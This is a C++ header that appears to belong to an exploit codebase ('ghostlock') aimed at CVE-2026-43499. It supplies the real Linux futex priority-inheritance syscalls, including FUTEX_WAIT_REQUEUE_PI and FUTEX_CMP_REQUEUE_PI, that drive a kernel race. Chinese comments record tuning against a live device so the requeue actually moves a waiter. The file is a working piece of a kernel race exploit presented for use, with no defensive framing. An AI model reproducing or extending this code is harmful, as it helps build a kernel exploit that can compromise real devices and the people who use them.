#pragma once
/** @file race/futex_seam_linux.hpp
 *  The real futex calls, behind the seam the race policy is written against.
 *
 *  pi_race.cpp is a shape and takes its syscalls from a policy type; this is the
 *  policy for the target: the four priority-inheritance operations the race uses,
 *  issued through the futex syscall with the operation numbers the interface
 *  defines. Nothing here decides anything -- it is the thin edge where the race
 *  meets the kernel, kept separate so the shape can be read and tested without
 *  one and the seam exercised on a device without the other.
 *
 *  Linux only: the syscall number and the structure of the calls are the
 *  platform's, which is why this file is not part of the host build.
 */
#include <cerrno>
#include <cstdint>

#include <linux/futex.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "backend/cve_2026_43499/race/pi_race.hpp"

namespace ghostlock::backend::cve_2026_43499::race {
    struct LinuxFutexSeam final {
        /** Take the lock for this thread, waiting for it if another holds it. */
        static int lock_pi(std::uint32_t *word) noexcept {
            return static_cast<int>(::syscall(SYS_futex, word, FUTEX_LOCK_PI, 0, nullptr, nullptr,
                                               0));
        }

        /** Release the lock, handing it to the highest-priority waiter. */
        static int unlock_pi(std::uint32_t *word) noexcept {
            return static_cast<int>(::syscall(SYS_futex, word, FUTEX_UNLOCK_PI, 0, nullptr, nullptr,
                                               0));
        }

        /** Park on the chain word and ask the kernel to requeue onto the target
         *  when the target's lock is released: the operation the race is built on. */
        static int wait_requeue_pi(std::uint32_t *chain, std::uint32_t *target) noexcept {
            /* 睡的条件是 chain 字**此刻**的值：写死 0 的话，被锤过的字一读不等就立刻
             *  EAGAIN 返回 —— 等待者根本没睡，require 那边自然搬 0 个。 */
            const std::uint32_t expected = (chain != nullptr) ? *chain : 0U;
            /* 有界：等待者绝不无期限停在这里（一次运行挂住过一次，教训记在同批记录里）。 */
            timespec deadline{};
            deadline.tv_sec = 0;
            deadline.tv_nsec = 50 * 1000 * 1000;   /* 50 ms */
            return static_cast<int>(::syscall(SYS_futex, chain, FUTEX_WAIT_REQUEUE_PI, expected,
                                               &deadline, target, 0));
        }

        /** The other side of that operation: requeue the chain's waiters here. */
        static int cmp_requeue_pi(std::uint32_t *chain, std::uint32_t *target) noexcept {
            /* cmp 的第三个参数必须等于 target 字**此刻**的值：调用时我们已持有它，
             *  它的值就是我们的 TID，写死 0 会让内核判 EAGAIN（真机量到搬 0 个）。 */
            const std::uint32_t expected = (target != nullptr) ? *target : 0U;
            /* nr_requeue 走 timeout 这个参数（这是这条系统调用的约定）：传 nullptr 就是 0 ⇒
             *  内核只唤醒、不搬 ⇒ 返回 0（设备上量的正是 0）。这里要搬 1 个。 */
            auto *want_requeue = reinterpret_cast<timespec *>(static_cast<std::uintptr_t>(1U));
            return static_cast<int>(::syscall(SYS_futex, chain, FUTEX_CMP_REQUEUE_PI, 1, want_requeue,
                                               target, expected));
        }
    };
}  // namespace ghostlock::backend::cve_2026_43499::race
